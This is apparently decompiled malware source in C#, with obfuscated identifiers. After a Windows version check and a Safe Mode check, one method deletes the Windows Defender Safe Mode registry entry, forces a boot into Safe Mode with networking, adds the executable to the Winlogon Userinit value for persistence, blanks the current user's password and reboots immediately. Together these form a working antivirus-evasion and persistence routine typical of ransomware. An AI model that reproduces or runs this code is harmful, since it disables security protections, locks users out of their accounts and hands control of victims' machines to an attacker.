using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace MufMaOSvGyvz;

public class jMDFRLEyorejfI
{
	[DllImport("user32.dll")]
	internal static extern int GetSystemMetrics(int int_0);

	public static string vgwIjtaVyLLgbVk()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = "";
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = "Me";
				break;
			case 10:
				text = ((!(version.Revision.ToString() == "2222A")) ? "98" : "98SE");
				break;
			case 0:
				text = "95";
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = "NT 3.51";
				break;
			case 4:
				text = "NT 4.0";
				break;
			case 5:
				text = ((version.Minor != 0) ? "XP" : "2000");
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? "8.1" : "8") : "7") : "Vista");
				break;
			case 10:
				text = "10";
				break;
			}
		}
		if (text != "")
		{
			text = "Windows " + text;
			if (oSVersion.ServicePack != "")
			{
				text = text + " " + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static bool tTkvXnIXBUwQ()
	{
		if (GetSystemMetrics(67) != 0)
		{
			return true;
		}
		return false;
	}

	public static void jIBYuxgbcSbmfjK()
	{
		IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("reg.exe", "delete HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\WinDefend /f");
		IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("bcdedit.exe", "/set {default} safeboot network");
		IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("reg.exe", "add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"" + Assembly.GetEntryAssembly()!.Location + "\",\"C:\\Windows\\system32\\userinit.exe\" /f");
		IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("net.exe", "user " + WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1] + " \"\"");
		IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("shutdown.exe", "/r /t 0");
	}

	public static void CFPjirxGMKMKPt()
	{
		if (!tTkvXnIXBUwQ())
		{
			jIBYuxgbcSbmfjK();
		}
	}
}
